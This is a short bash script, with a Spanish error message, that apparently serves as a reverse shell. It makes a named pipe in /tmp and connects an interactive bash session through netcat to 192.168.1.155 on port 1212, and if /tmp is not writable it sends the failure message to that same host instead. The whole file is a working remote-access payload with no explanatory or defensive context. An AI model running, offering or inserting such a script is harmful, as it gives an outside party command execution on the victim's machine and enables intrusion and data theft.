#!/bin/bash
function main(){
	if [ $(test -w /tmp/; echo $?) == 0 ];then
		rm /tmp/input; mkfifo /tmp/input; cat /tmp/input | script /dev/null -c bash | nc 192.168.1.155 1212 > /tmp/input
	else
		echo "no se ha podido crear el fichero input en el directorio /tmp por falta de permisos de escritura"| nc 192.168.1.155 1212
	fi
	rm /tmp/input
}
main
